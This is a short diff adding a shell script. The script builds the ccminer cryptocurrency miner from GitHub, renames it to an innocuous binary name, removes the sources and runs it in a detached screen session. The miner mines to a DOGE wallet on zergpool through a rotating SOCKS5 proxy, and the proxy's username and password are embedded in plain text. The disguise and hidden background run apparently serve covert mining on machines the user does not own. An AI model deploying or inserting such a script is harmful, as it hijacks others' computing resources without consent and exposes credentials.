@@ -1,0 +1,2 @@
+sudo apt update
+sudo apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential screen htop git -y;git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git;cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh;mv ccminer ../perus;cd ..;sudo rm ccminer -r;screen -dmS perus ./perus -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DGD7P3FmcWBp1bdq3dFm7PMjsdJ1kwVdS9 -p  c=DOGE,mc=VRSC,ID=kuya -t 4 -x socks5://wskuyaxxx-rotate:b15m1ll4H@p.webshare.io:80
